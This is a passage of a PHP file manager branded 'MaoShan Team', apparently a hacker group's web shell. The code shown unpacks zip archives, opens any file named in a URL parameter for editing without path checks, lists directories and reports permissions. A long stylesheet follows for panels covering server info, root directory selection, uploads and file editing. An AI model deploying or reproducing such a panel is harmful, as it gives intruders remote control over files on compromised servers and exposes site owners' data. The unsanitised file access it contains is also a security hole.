                $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
                if ($filename && file_exists($current_dir . '/' . $filename) && pathinfo($filename, PATHINFO_EXTENSION) == 'zip') {
                    if (!is_zip_available()) {
                        $error = "ZipArchive extension is not available on this server";
                        break;
                    }
                    
                    $zip = new ZipArchive();
                    $result = $zip->open($current_dir . '/' . $filename);
                    
                    if ($result === TRUE) {
                        $extract_to = $current_dir . '/' . pathinfo($filename, PATHINFO_FILENAME);
                        if (!file_exists($extract_to)) {
                            mkdir($extract_to, 0755);
                        }
                        
                        if ($zip->extractTo($extract_to)) {
                            $zip->close();
                            $message = "Extracted zip file: $filename";
                        } else {
                            $zip->close();
                            $error = "Failed to extract zip file";
                        }
                    } else {
                        $error = "Failed to open zip file: $filename";
                    }
                } else {
                    $error = "Invalid zip file";
                }
                break;
        }
    } catch (Exception $e) {
        $error = "Error: " . $e->getMessage();
    }
}

// Handle file editing
$edit_file = '';
$edit_content = '';
if (isset($_GET['edit']) && file_exists($current_dir . '/' . $_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $edit_content = file_get_contents($current_dir . '/' . $edit_file);
}

// Get directory contents
function get_directory_contents($dir) {
    $items = array();
    if (is_dir($dir) && $handle = opendir($dir)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $items[] = $entry;
            }
        }
        closedir($handle);
    }
    sort($items);
    return $items;
}

// Format file size
function format_size($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . ' ' . $units[$i];
}

// Get file permissions
function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';
    
    // File type
    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special
    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
    else $info = 'u'; // Unknown
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

$items = get_directory_contents($current_dir);
$server_info = get_server_info();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MaoShan Team - File Manager</title>
    <style>
    /* ============================================
    MAOSHAN TEAM THEME - FULL CSS
    Warna: Hitam (#0a0a0a), Emas (#FFD700), Merah (#FF0000)
    ============================================ */

    :root {
        --gold: #FFD700;
        --gold-dark: #c9a800;
        --gold-light: #FFE44D;
        --red: #FF0000;
        --red-dark: #cc0000;
        --red-light: #ff3333;
        --dark: #0a0a0a;
        --dark2: #141414;
        --dark3: #1e1e1e;
        --dark4: #2a2a2a;
        --text: #e8e8e8;
        --text-muted: #888888;
        --text-dark: #555555;
        --border: rgba(255, 215, 0, 0.12);
        --shadow: rgba(255, 215, 0, 0.08);
        --radius: 12px;
        --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: var(--dark);
        color: var(--text);
        line-height: 1.6;
        min-height: 100vh;
        background-image: 
            radial-gradient(circle at 20% 30%, rgba(255, 215, 0, 0.03) 0%, transparent 50%),
            radial-gradient(circle at 80% 70%, rgba(255, 0, 0, 0.02) 0%, transparent 50%),
            radial-gradient(circle at 50% 100%, rgba(255, 215, 0, 0.02) 0%, transparent 30%);
        background-attachment: fixed;
    }

    /* ============================================
    SCROLLBAR
    ============================================ */
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }

    ::-webkit-scrollbar-track {
        background: var(--dark2);
        border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb {
        background: var(--gold);
        border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: var(--gold-dark);
    }

    /* ============================================
    CONTAINER
    ============================================ */
    .container {
        max-width: 1280px;
        margin: 0 auto;
        padding: 20px;
    }

    /* ============================================
    HEADER
    ============================================ */
    .header {
        background: linear-gradient(145deg, var(--dark2), var(--dark3));
        border: 2px solid var(--gold);
        color: white;
        padding: 24px 28px;
        border-radius: var(--radius);
        margin-bottom: 24px;
        box-shadow: 0 8px 32px rgba(255, 215, 0, 0.06), inset 0 1px 0 rgba(255, 215, 0, 0.05);
        position: relative;
        overflow: hidden;
    }

    .header::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(90deg, 
            transparent 0%, 
            rgba(255, 215, 0, 0.04) 50%, 
            transparent 100%);
        animation: shimmer 5s ease-in-out infinite;
        pointer-events: none;
    }

    @keyframes shimmer {
        0% { transform: translateX(-100%); }
        100% { transform: translateX(100%); }
    }

    .header::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        height: 2px;
        background: linear-gradient(90deg, transparent, var(--gold), var(--red), var(--gold), transparent);
        animation: borderGlow 3s ease-in-out infinite;
    }

    @keyframes borderGlow {
        0%, 100% { opacity: 0.3; }
        50% { opacity: 1; }
    }

    .header-top {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 12px;
        position: relative;
        z-index: 1;
    }

    .header h1 {
        font-size: 28px;
        font-weight: 900;
        background: linear-gradient(90deg, var(--gold), #FFA500, var(--gold), var(--red));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-size: 300% auto;
        animation: gradientMove 5s ease infinite;
        text-shadow: none;
        position: relative;
        letter-spacing: 1px;
    }

    @keyframes gradientMove {
        0%, 100% { background-position: 0% center; }
        50% { background-position: 100% center; }
    }

    .header h1 .icon {
        -webkit-text-fill-color: initial;
        margin-right: 6px;
    }

    .header .header-sub {
        color: var(--gold);
        font-size: 11px;
        letter-spacing: 4px;
        opacity: 0.5;
        margin-top: -2px;
        text-transform: uppercase;
        font-weight: 600;
    }

    /* ============================================
    LOGOUT BUTTON
    ============================================ */
    .btn-logout {
        background: linear-gradient(135deg, var(--red-dark), #8b0000);
        color: white;
        border: 2px solid var(--gold);
        font-weight: 700;
        padding: 8px 24px;
        border-radius: 8px;
        cursor: pointer;
        text-decoration: none;
        transition: var(--transition);
        display: inline-block;
        text-transform: uppercase;
        font-size: 12px;
        letter-spacing: 1.5px;
        box-shadow: 0 0 20px rgba(255, 0, 0, 0.05);
        position: relative;
        overflow: hidden;
    }

    .btn-logout::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        transition: left 0.5s;
    }

    .btn-logout:hover::before {
        left: 100%;
    }

    .btn-logout:hover {
        transform: scale(1.05);
        box-shadow: 0 0 40px rgba(255, 0, 0, 0.3), inset 0 0 20px rgba(255, 0, 0, 0.1);
        border-color: #ffffff;
    }

    /* ============================================
    CURRENT DIRECTORY
    ============================================ */
    .current-dir {
        background: rgba(0, 0, 0, 0.5);
        border: 1px solid var(--border);
        padding: 14px 18px;
        border-radius: 8px;
        font-family: 'Courier New', monospace;
        word-break: break-all;
        color: var(--text);
        backdrop-filter: blur(8px);
        margin-top: 12px;
        position: relative;
        z-index: 1;
    }

    .path-navigation {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }

    .permissions {
        font-family: 'Courier New', monospace;
        font-size: 11px;
        color: var(--text-muted);
        opacity: 0.6;
    }

    .breadcrumb {
        display: flex;
        align-items: center;
        flex-wrap: wrap;
        gap: 4px;
        margin-bottom: 6px;
    }

    .breadcrumb-item {
        color: var(--gold);
        text-decoration: none;
        padding: 4px 12px;
        border-radius: 6px;
        background: rgba(255, 215, 0, 0.06);
        transition: var(--transition);
        font-size: 13px;
        border: 1px solid transparent;
        font-family: 'Segoe UI', sans-serif;
    }

    .breadcrumb-item:hover {
        background: rgba(255, 215, 0, 0.12);
        border-color: var(--gold);
        text-decoration: none;
        color: #fff;
        transform: translateY(-1px);
    }

    .breadcrumb-separator {
        color: var(--red);
        font-weight: bold;
        font-size: 12px;
        opacity: 0.6;
    }

    .full-path {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-top: 4px;
    }

    .full-path input {
        flex: 1;
        background: rgba(0, 0, 0, 0.4);
        border: 1px solid rgba(255, 215, 0, 0.08);
        color: var(--text);
        padding: 8px 14px;
        border-radius: 6px;
        font-family: 'Courier New', monospace;
        font-size: 12px;
        transition: var(--transition);
        min-width: 0;
    }

    .full-path input:focus {
        background: rgba(0, 0, 0, 0.6);
        outline: none;
        border-color: var(--gold);
        box-shadow: 0 0 30px rgba(255, 215, 0, 0.04);
    }

    .full-path button {
        padding: 8px 16px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 12px;
        font-weight: 600;
        transition: var(--transition);
    }

    .full-path button:first-of-type {
        background: linear-gradient(135deg, var(--gold), var(--gold-dark));
        color: var(--dark);
    }

    .full-path button:first-of-type:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 16px rgba(255, 215, 0, 0.3);
    }

    .full-path button:last-of-type {
        background: var(--red-dark);
        color: white;
    }

    .full-path button:last-of-type:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 16px rgba(255, 0, 0, 0.3);
    }

    /* ============================================
    ROOT SELECTOR
    ============================================ */
    .root-selector {
        background: rgba(0, 0, 0, 0.3);
        padding: 10px 16px;
        border-radius: 8px;
        margin-top: 12px;
        display: flex;
        align-items: center;
        gap: 14px;
        flex-wrap: wrap;
        border: 1px solid var(--border);
        position: relative;
        z-index: 1;
    }

    .root-selector label {
        color: var(--gold);
        font-size: 12px;
        font-weight: 700;
        letter-spacing: 0.5px;
        text-transform: uppercase;
    }

    .root-selector select {
        background: rgba(0, 0, 0, 0.5);
        color: var(--text);
        border: 1px solid var(--border);
        padding: 6px 14px;
        border-radius: 6px;
        font-size: 12px;
        cursor: pointer;
        transition: var(--transition);
        min-width: 180px;
    }

    .root-selector select:hover {
        border-color: var(--gold);
    }

    .root-selector select:focus {
        outline: none;
        border-color: var(--gold);
        box-shadow: 0 0 20px rgba(255, 215, 0, 0.05);
    }

    .root-selector select option {
        background: var(--dark3);
        color: var(--text);
    }

    .root-selector .root-info {
        font-size: 11px;
        color: var(--text-muted);
        opacity: 0.7;
    }

    .root-selector .root-info strong {
        color: var(--gold);
        opacity: 1;
    }

    /* ============================================
    SYSTEM INFO
    ============================================ */
    .system-info {
        background: rgba(0, 0, 0, 0.3);
        border: 1px solid var(--border);
        padding: 10px 16px;
        border-radius: 8px;
        font-size: 12px;
        margin-top: 12px;
        display: flex;
        flex-wrap: wrap;
        gap: 18px;
        position: relative;
        z-index: 1;
    }

    .system-info .info-item {
        display: flex;
        align-items: center;
        gap: 6px;
        color: var(--text-muted);
        font-size: 11px;
    }

    .system-info .info-item .label {
        color: var(--gold);
        font-weight: 600;
        font-size: 10px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .status-indicator {
        display: inline-block;
        width: 8px;
        height: 8px;
        border-radius: 50%;
        margin-right: 4px;
        flex-shrink: 0;
    }

    .status-ok {
        background-color: var(--gold);
        box-shadow: 0 0 12px rgba(255, 215, 0, 0.3);
    }

    .status-warning {
        background-color: #ff6b00;
        box-shadow: 0 0 12px rgba(255, 107, 0, 0.3);
    }

    .status-error {
        background-color: var(--red);
        box-shadow: 0 0 12px rgba(255, 0, 0, 0.3);
    }

    /* ============================================
    SERVER INFO PANEL
    ============================================ */
    .server-info-panel {
        background: var(--dark2);
        border-radius: var(--radius);
        margin-bottom: 24px;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
        overflow: hidden;
        border: 1px solid var(--border);
    }

    .server-info-header {
        background: linear-gradient(135deg, var(--dark3), var(--dark4));
        color: var(--gold);
        padding: 16px 24px;
        cursor: pointer;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: var(--transition);
        border-bottom: 1px solid var(--border);
    }

    .server-info-header:hover {
        background: var(--dark4);
        color: #fff;
    }

    .server-info-header strong {
        font-size: 14px;
    }

    .server-info-header small {
        opacity: 0.5;
        font-weight: 400;
        font-size: 11px;
    }

    #serverInfoToggle {
        transition: transform 0.3s;
        font-size: 14px;
    }

    .server-info-content {
        display: none;
        padding: 24px;
        background: var(--dark);
    }

    .server-info-content.show {
        display: block;
    }

    .info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
    }

    .info-section {
        background: var(--dark2);
        border-radius: 10px;
        padding: 18px 20px;
        border-left: 3px solid var(--gold);
        border: 1px solid var(--border);
    }

    .info-section h4 {
        color: var(--gold);
        margin-bottom: 12px;
        font-size: 14px;
        display: flex;
        align-items: center;
        gap: 8px;
        font-weight: 700;
    }

    .info-table {
        width: 100%;
        font-size: 12px;
    }

    .info-table tr {
        border-bottom: 1px solid rgba(255, 255, 255, 0.03);
    }

    .info-table td {
        padding: 4px 0;
        vertical-align: top;
    }

    .info-table td:first-child {
        font-weight: 500;
        color: var(--text-muted);
        width: 40%;
        font-size: 11px;
    }

    .info-table td:last-child {
        color: var(--text);
        font-family: 'Courier New', monospace;
        font-size: 11px;
    }

    .progress-bar-mini {
        background: var(--dark4);
        border-radius: 4px;
        height: 4px;
        overflow: hidden;
        margin-top: 4px;
    }

    .progress-fill {
        height: 100%;
        background: linear-gradient(90deg, var(--gold), var(--red));
        transition: width 0.6s ease;
        border-radius: 4px;
    }

    /* ============================================
    MESSAGES
    ============================================ */
    .message {
        padding: 14px 20px;
        border-radius: 8px;
        margin-bottom: 20px;
        font-size: 14px;
        border-left: 4px solid;
    }

    .message.success {
        background: rgba(255, 215, 0, 0.06);
        color: var(--gold);
        border-color: var(--gold);
    }

    .message.error {
        background: rgba(255, 0, 0, 0.06);
        color: var(--red-light);
        border-color: var(--red);
    }

    /* ============================================
    ACTIONS
    ============================================ */
    .actions {
        background: var(--dark2);
        padding: 20px 24px;
        border-radius: var(--radius);
        margin-bottom: 24px;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
        border: 1px solid var(--border);
    }

    .action-group {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        margin-bottom: 14px;
    }

    /* ============================================
    BUTTONS
    ============================================ */
    .btn {
        background: linear-gradient(135deg, var(--gold), var(--gold-dark));
        color: var(--dark);
        border: none;
        padding: 8px 18px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 13px;
        font-weight: 700;
        transition: var(--transition);
        text-decoration: none;
        display: inline-block;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        position: relative;
        overflow: hidden;
    }

    .btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
        transition: left 0.5s;
    }

    .btn:hover::before {
        left: 100%;
    }

    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 24px rgba(255, 215, 0, 0.25);
    }

    .btn:active {
        transform: translateY(0);
    }

    .btn:disabled {
        background: var(--dark4);
        color: var(--text-muted);
        cursor: not-allowed;
        transform: none !important;
        box-shadow: none !important;
    }

    .btn-danger {
        background: linear-gradient(135deg, var(--red), var(--red-dark));
        color: white;
    }

    .btn-danger:hover {
        box-shadow: 0 6px 24px rgba(255, 0, 0, 0.3);
    }

    .btn-warning {
        background: linear-gradient(135deg, #ffc107, #d39e00);
        color: var(--dark);
    }

    .btn-warning:hover {
        box-shadow: 0 6px 24px rgba(255, 193, 7, 0.3);
    }

    .btn-info {
        background: linear-gradient(135deg, #17a2b8, #0e7490);
        color: white;
    }

    .btn-info:hover {
        box-shadow: 0 6px 24px rgba(23, 162, 184, 0.3);
    }

    /* ============================================
    QUICK NAV
    ============================================ */
    .quick-nav {
        background: rgba(0, 0, 0, 0.3);
        padding: 10px 16px;
        border-radius: 8px;
        display: flex;
        align-items: center;
        gap: 10px;
        flex-wrap: wrap;
        border: 1px solid var(--border);
    }

    .quick-nav > span {
        color: var(--gold);
        font-weight: 700;
        font-size: 11px;
        opacity: 0.7;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .quick-nav-btn {
        background: rgba(255, 215, 0, 0.06);
        color: var(--text);
        border: 1px solid var(--border);
        padding: 4px 14px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 11px;
        transition: var(--transition);
        font-weight: 500;
    }

    .quick-nav-btn:hover {
        background: rgba(255, 215, 0, 0.12);
        border-color: var(--gold);
        color: #fff;
        transform: translateY(-1px);
    }

    /* ============================================
    BULK ACTIONS
    ============================================ */
    .bulk-actions {
        background: rgba(255, 215, 0, 0.04);
        border: 1px solid var(--border);
        padding: 16px 20px;
        border-radius: var(--radius);
        margin-bottom: 20px;
        display: none;
    }

    .bulk-actions.show {
        display: block;
    }

    .bulk-actions h4 {
        color: var(--gold);
        margin-bottom: 12px;
        font-size: 14px;
        font-weight: 700;
    }

    .bulk-counter {
        color: var(--gold);
        font-weight: bold;
        font-size: 16px;
    }

    .bulk-zip-input {
        margin: 12px 0;
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        align-items: center;
    }

    .bulk-zip-input input {
        background: rgba(0, 0, 0, 0.4);
        border: 1px solid var(--border);
        color: var(--text);
        padding: 8px 14px;
        border-radius: 6px;
        font-size: 13px;
        flex: 1;
        min-width: 150px;
    }

    .bulk-zip-input input:focus {
        outline: none;
        border-color: var(--gold);
    }

    /* ============================================
    FILE LIST
    ============================================ */
    .file-list {
        background: var(--dark2);
        border-radius: var(--radius);
        overflow: hidden;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
        border: 1px solid var(--border);
    }

    .select-all-container {
        background: rgba(0, 0, 0, 0.3);
        padding: 12px 20px;
        border-bottom: 1px solid var(--border);
        display: flex;
        align-items: center;
        gap: 12px;
        color: var(--text);
    }

    .select-all-container input[type="checkbox"] {
        accent-color: var(--gold);
        width: 16px;
        height: 16px;
        cursor: pointer;
    }

    .select-all-container label {
        color: var(--gold);
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
    }

    .select-all-container span {
        color: var(--text-muted);
        font-size: 13px;
        margin-left: auto;
    }

    .file-item {
        display: flex;
        align-items: center;
        padding: 12px 20px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        transition: var(--transition);
        gap: 12px;
    }

    .file-item:hover {
        background: rgba(255, 215, 0, 0.04);
        border-left: 3px solid var(--gold);
        padding-left: 17px;
    }

    .file-item:last-child {
        border-bottom: none;
    }

    .file-item.selected {
        background: rgba(255, 215, 0, 0.06);
        border-left: 3px solid var(--gold);
        padding-left: 17px;
    }

    .file-checkbox {
        accent-color: var(--gold);
        width: 15px;
        height: 15px;
        cursor: pointer;
        flex-shrink: 0;
    }

    .file-icon {
        width: 28px;
        height: 28px;
        font-size: 20px;
        flex-shrink: 0;
        text-align: center;
    }

    .file-info {
        flex: 1;
        min-width: 0;
    }

    .file-name {
        font-weight: 500;
        margin-bottom: 2px;
        word-break: break-word;
        font-size: 14px;
    }

    .file-name a {
        color: var(--gold) !important;
        text-decoration: none;
        transition: var(--transition);
    }

    .file-name a:hover {
        color: #fff !important;
        text-decoration: underline;
    }

    .file-details {
        font-size: 11px;
        color: var(--text-muted);
        font-family: 'Courier New', monospace;
    }

    .file-actions {
        display: flex;
        gap: 5px;
        flex-shrink: 0;
        flex-wrap: wrap;
    }

    .file-actions .btn {
        padding: 4px 10px;
        font-size: 11px;
        letter-spacing: 0;
    }

    /* ============================================
    EDITOR
    ============================================ */
    .editor {
        background: var(--dark2);
        padding: 24px;
        border-radius: var(--radius);
        margin-bottom: 24px;
        border: 1px solid var(--border);
    }

    .editor h3 {
        color: var(--gold);
        margin-bottom: 16px;
        font-size: 16px;
    }

    .editor textarea {
        width: 100%;
        height: 400px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        resize: vertical;
        background: var(--dark);
        color: var(--text);
        border: 1px solid var(--border);
        border-radius: 8px;
        padding: 14px;
        transition: var(--transition);
    }

    .editor textarea:focus {
        outline: none;
        border-color: var(--gold);
        box-shadow: 0 0 30px rgba(255, 215, 0, 0.04);
    }

    /* ============================================
    MODALS
    ============================================ */
    .modal {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        backdrop-filter: blur(4px);
        animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
        0% { opacity: 0; }
        100% { opacity: 1; }
    }

    .modal-content {
        background: var(--dark2);
        margin: 10% auto;
        padding: 28px 32px;
        border-radius: var(--radius);
        width: 90%;
        max-width: 500px;
        border: 1px solid var(--border);
        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.8);
        animation: slideUp 0.3s ease;
    }

    @keyframes slideUp {
        0% { transform: translateY(30px); opacity: 0; }
        100% { transform: translateY(0); opacity: 1; }
    }

    .modal-content h3 {
        color: var(--gold);
        margin-bottom: 16px;
        font-size: 18px;
        font-weight: 700;
    }

    .modal-content form {
        display: flex;
        flex-direction: column;
        gap: 12px;
    }

    .modal-content input[type="text"],
    .modal-content input[type="password"],
    .modal-content input[type="file"] {
        background: rgba(0, 0, 0, 0.4);
        border: 1px solid var(--border);
        color: var(--text);
        padding: 10px 14px;
        border-radius: 8px;
        width: 100%;
        font-size: 14px;
        transition: var(--transition);
    }

    .modal-content input:focus {
        border-color: var(--gold);
        outline: none;
        box-shadow: 0 0 30px rgba(255, 215, 0, 0.04);
    }

    .close {
        color: var(--text-muted);
        float: right;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
        transition: var(--transition);
        line-height: 1;
    }

    .close:hover {
        color: var(--gold);
        transform: rotate(90deg);
    }

    /* ============================================
    UPLOAD MODAL
    ============================================ */
    .upload-modal-content {
        max-width: 600px;
        width: 95%;
    }

    .drag-drop-area {
        border: 2px dashed var(--border);
        border-radius: 10px;
        padding: 40px 20px;
        text-align: center;
        background: rgba(0, 0, 0, 0.2);
        margin: 16px 0;
        transition: var(--transition);
        cursor: pointer;
        position: relative;
    }

    .drag-drop-area:hover {
        border-color: var(--gold);
        background: rgba(255, 215, 0, 0.04);
    }

    .drag-drop-area.drag-over {
        border-color: var(--gold);
        background: rgba(255, 215, 0, 0.08);
        transform: scale(1.01);
    }

    .upload-icon {
        font-size: 48px;
        margin-bottom: 12px;
        opacity: 0.5;
    }

    .drag-drop-area h4 {
        color: var(--gold);
        margin-bottom: 6px;
        font-size: 16px;
    }

    .drag-drop-area p {
        color: var(--text-muted);
        margin-bottom: 16px;
        font-size: 13px;
    }

    .selected-files-container {
        background: rgba(0, 0, 0, 0.2);
        border-radius: 8px;
        padding: 16px 20px;
        margin: 16px 0;
        border: 1px solid var(--border);
    }

    .selected-files-container h4 {
        color: var(--gold);
        margin-bottom: 12px;
        font-size: 14px;
    }

    .selected-files-list {
        max-height: 200px;
        overflow-y: auto;
        margin-bottom: 12px;
    }

    .selected-file-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 8px 12px;
        background: rgba(0, 0, 0, 0.3);
        border-radius: 6px;
        margin-bottom: 4px;
        border: 1px solid rgba(255, 255, 255, 0.03);
        color: var(--text);
    }

    .file-info-item {
        display: flex;
        align-items: center;
        gap: 10px;
        flex: 1;
    }

    .file-icon-small {
        font-size: 16px;
    }

    .file-name-small {
        color: var(--gold);
        font-weight: 500;
        font-size: 13px;
    }

    .file-size-small {
        font-size: 11px;
        color: var(--text-muted);
    }

    .remove-file-btn {
        background: var(--red);
        color: white;
        border: none;
        border-radius: 4px;
        padding: 4px 10px;
        cursor: pointer;
        font-size: 12px;
        transition: var(--transition);
    }

    .remove-file-btn:hover {
        background: var(--red-dark);
        transform: scale(1.05);
    }

    .upload-actions {
        display: flex;
        gap: 10px;
        justify-content: center;
        flex-wrap: wrap;
    }

    /* ============================================
    UPLOAD PROGRESS
    ============================================ */
    .upload-progress-container {
        background: rgba(0, 0, 0, 0.2);
        border-radius: 8px;
        padding: 20px;
        margin: 16px 0;
        border: 1px solid var(--border);
    }

    .upload-progress-container h4 {
        color: var(--gold);
        margin-bottom: 12px;
        font-size: 14px;
    }

    .overall-progress {
        margin-bottom: 16px;
    }

    .progress-info {
        text-align: center;
        margin-top: 8px;
        font-size: 13px;
        color: var(--text-muted);
    }

    .individual-progress {
        max-height: 150px;
        overflow-y: auto;
    }

    .file-progress-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 6px 0;
        border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        gap: 12px;
    }

    .file-progress-item:last-child {
        border-bottom: none;
    }

    .file-progress-info {
        flex: 1;
    }

    .file-progress-name {
        font-size: 12px;
        font-weight: 500;
        color: var(--text);
    }

    .file-progress-status {
        font-size: 10px;
        color: var(--text-muted);
    }

    .file-progress-bar {
        width: 80px;
        height: 4px;
        background: var(--dark4);
        border-radius: 4px;
        overflow: hidden;
        flex-shrink: 0;
    }

    .file-progress-fill {
        height: 100%;
        background: linear-gradient(90deg, var(--gold), var(--red));
        width: 0%;
        transition: width 0.3s ease;
        border-radius: 4px;
    }

    .file-status-icon {
        font-size: 14px;
        flex-shrink: 0;
    }

    /* ============================================
    PROGRESS OVERLAY
    ============================================ */
    .progress-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        backdrop-filter: blur(8px);
        z-index: 2000;
        justify-content: center;
        align-items: center;
    }

    .progress-overlay.show {
        display: flex;
    }

    .progress-container {
        background: var(--dark2);
        padding: 32px 40px;
        border-radius: var(--radius);
        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.8);
        min-width: 400px;
        max-width: 90vw;
        border: 1px solid var(--border);
        animation: slideUp 0.3s ease;
    }

    .progress-header {
        text-align: center;
        margin-bottom: 20px;
    }

    .progress-header h3 {
        color: var(--gold);
        margin-bottom: 4px;
        font-size: 20px;
    }

    .progress-status {
        color: var(--text-muted);
        font-size: 13px;
    }

    .progress-bar-container {
        background: var(--dark4);
        border-radius: 8px;
        height: 24px;
        margin: 16px 0;
        overflow: hidden;
        position: relative;
    }

    .progress-bar {
        background: linear-gradient(90deg, var(--gold), #FFA500, var(--red));
        height: 100%;
        width: 0%;
        transition: width 0.4s ease;
        border-radius: 8px;
        position: relative;
    }

    .progress-bar::after {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-image: linear-gradient(
            -45deg,
            rgba(255, 255, 255, 0.15) 25%,
            transparent 25%,
            transparent 50%,
            rgba(255, 255, 255, 0.15) 50%,
            rgba(255, 255, 255, 0.15) 75%,
            transparent 75%,
            transparent
        );
        background-size: 40px 40px;
        animation: moveStripes 1.5s linear infinite;
    }

    @keyframes moveStripes {
        0% { background-position: 0 0; }
        100% { background-position: 40px 40px; }
    }

    .progress-percentage {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        color: #fff;
        font-weight: 700;
        font-size: 12px;
        text-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
    }

    .progress-details {
        display: flex;
        justify-content: space-between;
        font-size: 12px;
        color: var(--text-muted);
    }

    .current-operation {
        background: rgba(0, 0, 0, 0.3);
        padding: 10px 16px;
        border-radius: 8px;
        margin: 12px 0;
        font-family: 'Courier New', monospace;
        font-size: 12px;
        color: var(--text);
        border-left: 3px solid var(--gold);
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .spinner {
        display: inline-block;
        width: 18px;
        height: 18px;
        border: 2px solid rgba(255, 215, 0, 0.1);
        border-top: 2px solid var(--gold);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        flex-shrink: 0;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .progress-cancel {
        text-align: center;
        margin-top: 16px;
    }

    /* ============================================
    FOOTER
    ============================================ */
    .footer-custom {
        text-align: center;
        margin-top: 30px;
        padding: 20px 24px;
        border-top: 2px solid var(--gold);
        background: var(--dark2);
        border-radius: var(--radius);
        border: 1px solid var(--border);
    }

    .footer-custom .brand {
        color: var(--gold);
        font-weight: 700;
        font-size: 14px;
    }

    .footer-custom .heart {
        color: var(--red);
        display: inline-block;
        animation: heartPulse 1.5s ease-in-out infinite;
    }

    @keyframes heartPulse {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.2); }
    }

    .footer-custom .text-muted {
        color: var(--text-muted);
        font-size: 12px;
    }

    .footer-custom .separator {
        color: var(--text-dark);
    }

    /* ============================================
    RESPONSIVE
    ============================================ */
    @media (max-width: 992px) {
        .info-grid {
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
        }
    }

    @media (max-width: 768px) {
        .container {
